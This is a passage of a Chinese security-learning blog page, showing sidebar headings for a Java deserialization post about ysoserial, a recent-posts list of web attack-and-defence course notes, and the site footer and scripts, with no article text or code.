href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">3.</span> <span class="toc-text">#前置知识:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E6%A6%82%E5%BF%B5%EF%BC%9A"><span class="toc-number">3.1.</span> <span class="toc-text">序列化和反序列化的概念：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E6%8E%A5%E5%8F%A3%EF%BC%9A"><span class="toc-number">3.2.</span> <span class="toc-text">函数接口：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%87%BA%E7%8E%B0%EF%BC%9A"><span class="toc-number">3.3.</span> <span class="toc-text">数据出现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="toc-number">3.4.</span> <span class="toc-text">-发现：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-number">3.5.</span> <span class="toc-text">-利用：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">演示案例：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">复现：</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%9E%A2-%E5%8E%9F%E7%94%9FAPI-Ysoserial-URLDNS%E4%BD%BF%E7%94%A8"><span class="toc-number">5.0.1.</span> <span class="toc-text">➢ 原生API-Ysoserial_URLDNS使用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%9E%A2-%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6-Ysoserial-%E6%94%AF%E6%8C%81%E5%BA%93%E7%94%9F%E6%88%90%E4%BD%BF%E7%94%A8"><span class="toc-number">5.0.2.</span> <span class="toc-text">➢ 三方组件-Ysoserial_支持库生成使用</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%9A"><span class="toc-number">5.0.2.1.</span> <span class="toc-text">分析漏洞：</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%EF%BC%9A%E2%80%94-ysoserial%E5%B7%A5%E5%85%B7"><span class="toc-number">5.0.2.2.</span> <span class="toc-text">利用漏洞：—-ysoserial工具</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/" title="Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证"><img src="https://pic4.zhimg.com/80/v2-080542549e30861aefcaa960b6ff26f7_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证"/></a><div class="content"><a class="title" href="/2023/02/03/Day49-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81/" title="Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证">Day49 WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</a><time datetime="2023-02-02T17:53:34.000Z" title="发表于 2023-02-03 01:53:34">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法"><img src="https://pic4.zhimg.com/80/v2-af80b26c6bd5a71eba219eb1e10b579b_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法"/></a><div class="content"><a class="title" href="/2023/02/03/Day48-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/" title="Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法">Day48 WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</a><time datetime="2023-02-02T17:52:08.000Z" title="发表于 2023-02-03 01:52:08">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" title="Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全"><img src="https://pic4.zhimg.com/80/80e8e3545dacbde5b49c74c8efbfd483_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全"/></a><div class="content"><a class="title" href="/2023/02/03/Day47-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8/" title="Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全">Day47 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</a><time datetime="2023-02-02T17:50:28.000Z" title="发表于 2023-02-03 01:50:28">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/" title="Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"><img src="https://pic4.zhimg.com/80/c380ba809ac2a91f827893f3cc251f7f_1440w.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"/></a><div class="content"><a class="title" href="/2023/02/03/Day46-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7/" title="Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性">Day46 WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</a><time datetime="2023-02-02T17:49:20.000Z" title="发表于 2023-02-03 01:49:20">2023-02-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"><img src="https://pic1.zhimg.com/v2-9856f774c9c5751c3b14d25a1de40a54_r.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类"/></a><div class="content"><a class="title" href="/2023/02/03/Day45-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-POP%E9%93%BE%E6%9E%84%E9%80%A0-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类">Day45 WEB攻防-通用漏洞&amp;PHP反序列化&amp;POP链构造&amp;魔术方法&amp;原生类</a><time datetime="2023-02-02T17:41:32.000Z" title="发表于 2023-02-03 01:41:32">2023-02-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By pwy</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
